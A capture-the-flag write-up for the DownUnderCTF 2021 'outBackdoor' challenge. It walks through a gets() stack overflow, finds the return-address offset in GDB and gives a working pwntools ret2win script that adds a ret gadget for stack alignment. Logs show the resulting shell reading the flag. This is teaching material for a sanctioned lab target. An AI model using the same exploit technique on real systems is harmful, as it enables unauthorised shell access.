# outBackdoor

## Description

Fool me once, shame on you. Fool me twice, shame on me.

Author: xXl33t_h@x0rXx

nc pwn-2021.duc.tf 31921

## Analysis

IDA:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[16]; // [rsp+0h] [rbp-10h] BYREF

  buffer_init(argc, argv, envp);
  puts("\nFool me once, shame on you. Fool me twice, shame on me.");
  puts("\nSeriously though, what features would be cool? Maybe it could play a song?");
  gets(v4);
  return 0;
}

int outBackdoor()
{
  puts("\n\nW...w...Wait? Who put this backdoor out back here?");
  return system("/bin/sh");
}
```

We see the unsafe function `gets` and the `outBackdoor` function that gives us the shell.

Let's open it in GDB, create a pattern, and identify the offset:

```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000401195 <+0>:     push   rbp
   0x0000000000401196 <+1>:     mov    rbp,rsp
   0x0000000000401199 <+4>:     sub    rsp,0x10
   0x000000000040119d <+8>:     mov    eax,0x0
   0x00000000004011a2 <+13>:    call   0x401152 <buffer_init>
   0x00000000004011a7 <+18>:    lea    rdi,[rip+0xe5a]        # 0x402008
   0x00000000004011ae <+25>:    call   0x401030 <puts@plt>
   0x00000000004011b3 <+30>:    lea    rdi,[rip+0xe8e]        # 0x402048
   0x00000000004011ba <+37>:    call   0x401030 <puts@plt>
   0x00000000004011bf <+42>:    lea    rax,[rbp-0x10]
   0x00000000004011c3 <+46>:    mov    rdi,rax
   0x00000000004011c6 <+49>:    mov    eax,0x0
   0x00000000004011cb <+54>:    call   0x401060 <gets@plt>
   0x00000000004011d0 <+59>:    mov    eax,0x0
   0x00000000004011d5 <+64>:    leave  
   0x00000000004011d6 <+65>:    ret    
End of assembler dump.
gdb-peda$ break *(main+54)
Breakpoint 1 at 0x4011cb
gdb-peda$ r
Starting program: /home/kali/Downloads/outBackdoor 

Fool me once, shame on you. Fool me twice, shame on me.

Seriously though, what features would be cool? Maybe it could play a song?
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7eddf33 (<__GI___libc_write+19>:    cmp    rax,0xfffffffffffff000)
RDX: 0x0 
RSI: 0x7ffff7fae723 --> 0xfb0670000000000a 
RDI: 0x7fffffffdf40 --> 0x7fffffffe040 --> 0x1 
RBP: 0x7fffffffdf50 --> 0x401200 (<__libc_csu_init>:    push   r15)
RSP: 0x7fffffffdf40 --> 0x7fffffffe040 --> 0x1 
RIP: 0x4011cb (<main+54>:       call   0x401060 <gets@plt>)
R8 : 0x4c ('L')
R9 : 0x7ffff7fe21b0 (<_dl_fini>:        push   rbp)
R10: 0x7ffff7fef300 (<strcmp+4464>:     pxor   xmm0,xmm0)
R11: 0x246 
R12: 0x401070 (<_start>:        xor    ebp,ebp)
R13: 0x0 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011bf <main+42>:  lea    rax,[rbp-0x10]
   0x4011c3 <main+46>:  mov    rdi,rax
   0x4011c6 <main+49>:  mov    eax,0x0
=> 0x4011cb <main+54>:  call   0x401060 <gets@plt>
   0x4011d0 <main+59>:  mov    eax,0x0
   0x4011d5 <main+64>:  leave  
   0x4011d6 <main+65>:  ret    
   0x4011d7 <outBackdoor>:      push   rbp
Guessed arguments:
arg[0]: 0x7fffffffdf40 --> 0x7fffffffe040 --> 0x1 
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdf40 --> 0x7fffffffe040 --> 0x1 
0008| 0x7fffffffdf48 --> 0x0 
0016| 0x7fffffffdf50 --> 0x401200 (<__libc_csu_init>:   push   r15)
0024| 0x7fffffffdf58 --> 0x7ffff7e15d0a (<__libc_start_main+234>:       mov    edi,eax)
0032| 0x7fffffffdf60 --> 0x7fffffffe048 --> 0x7fffffffe388 ("/home/kali/Downloads/outBackdoor")
0040| 0x7fffffffdf68 --> 0x100000000 
0048| 0x7fffffffdf70 --> 0x401195 (<main>:      push   rbp)
0056| 0x7fffffffdf78 --> 0x7ffff7e157cf (<init_cacheinfo+287>:  mov    rbp,rax)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x00000000004011cb in main ()
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ ni
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffdf40 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RBX: 0x0 
RCX: 0x7ffff7fad980 --> 0xfbad208b 
RDX: 0x0 
RSI: 0x7ffff7fada03 --> 0xfb0680000000000a 
RDI: 0x7ffff7fb0680 --> 0x0 
RBP: 0x7fffffffdf50 ("AACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RSP: 0x7fffffffdf40 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RIP: 0x4011d0 (<main+59>:       mov    eax,0x0)
R8 : 0x7fffffffdf40 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
R9 : 0x0 
R10: 0x7ffff7fef300 (<strcmp+4464>:     pxor   xmm0,xmm0)
R11: 0x246 
R12: 0x401070 (<_start>:        xor    ebp,ebp)
R13: 0x0 
R14: 0x0 
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011c3 <main+46>:  mov    rdi,rax
   0x4011c6 <main+49>:  mov    eax,0x0
   0x4011cb <main+54>:  call   0x401060 <gets@plt>
=> 0x4011d0 <main+59>:  mov    eax,0x0
   0x4011d5 <main+64>:  leave  
   0x4011d6 <main+65>:  ret    
   0x4011d7 <outBackdoor>:      push   rbp
   0x4011d8 <outBackdoor+1>:    mov    rbp,rsp
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdf40 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0x7fffffffdf48 ("ABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0016| 0x7fffffffdf50 ("AACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0x7fffffffdf58 ("(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0032| 0x7fffffffdf60 ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0040| 0x7fffffffdf68 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0048| 0x7fffffffdf70 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0056| 0x7fffffffdf78 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00000000004011d0 in main ()
gdb-peda$ pattern offset AAA%AAsAA
AAA%AAsAA found at offset: 0
gdb-peda$ pattern offset AACAA-A
AACAA-A found at offset: 16
gdb-peda$ 
```

The pattern is found in RBP at offset 16, so our RIP will be at 24. 
Let's also check the security:

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

PIE is disabled, so we can just hardcode the `outBackdoor` address

Let's write the script:

```python
from pwn import *

r = process('./outBackdoor')
binary = ELF('./outBackdoor')
print(r.recvuntil(b"song?"))
r.sendline(b"A" * 24 + p64(binary.sym['outBackdoor']))
r.interactive()
```

```
[+] Opening connection to pwn-2021.duc.tf on port 31921: Done
[+] Starting local process './outBackdoor' argv=[b'./outBackdoor'] : pid 2532
[*] '/home/kali/Downloads/outBackdoor'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[DEBUG] Received 0x85 bytes:
    b'\n'
    b'Fool me once, shame on you. Fool me twice, shame on me.\n'
    b'\n'
    b'Seriously though, what features would be cool? Maybe it could play a song?\n'
[DEBUG] Sent 0x21 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  d7 11 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000020  0a                                                  │·│
    00000021
[*] Switching to interactive mode

[DEBUG] Received 0x35 bytes:
    b'\n'
    b'\n'
    b'W...w...Wait? Who put this backdoor out back here?\n'


W...w...Wait? Who put this backdoor out back here?
$ whoami
[DEBUG] Sent 0x7 bytes:
    b'whoami\n'
[DEBUG] Received 0x5 bytes:
    b'kali\n'
kali
$  
```

Got the shell! Let's try it on remote:

```
[*] Got EOF while reading in interactive
```

That's not good. This means our shell didn't work on remote.
Most probably it uses a different version of libc that uses `movaps` at `system`
that expects 16-byte stack alignment. The easiest solution is to jump to an instruction
that removes 8 bytes from the stack, such as `ret`, which is found at `main+65`. Then our script becomes:

```python
from pwn import *

context.log_level = 'debug'

r = remote('pwn-2021.duc.tf', 31921)
binary = ELF('./outBackdoor')
r.recvuntil(b"song?")
r.sendline(b"A" * 24 + p64(binary.sym['main'] + 65) + p64(binary.sym['outBackdoor']))
r.interactive()
```

```
[+] Opening connection to pwn-2021.duc.tf on port 31921: Done
[*] '/home/kali/Downloads/outBackdoor'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[DEBUG] Received 0x85 bytes:
    b'\n'
    b'Fool me once, shame on you. Fool me twice, shame on me.\n'
    b'\n'
    b'Seriously though, what features would be cool? Maybe it could play a song?\n'
[DEBUG] Sent 0x29 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  d6 11 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000020  d7 11 40 00  00 00 00 00  0a                        │··@·│····│·│
    00000029
[*] Switching to interactive mode

[DEBUG] Received 0x35 bytes:
    b'\n'
    b'\n'
    b'W...w...Wait? Who put this backdoor out back here?\n'


W...w...Wait? Who put this backdoor out back here?
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0xd bytes:
    b'flag.txt\n'
    b'pwn\n'
flag.txt
pwn
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x32 bytes:
    b'DUCTF{https://www.youtube.com/watch?v=XfR9iY5y94s}'
DUCTF{https://www.youtube.com/watch?v=XfR9iY5y94s}$  
```


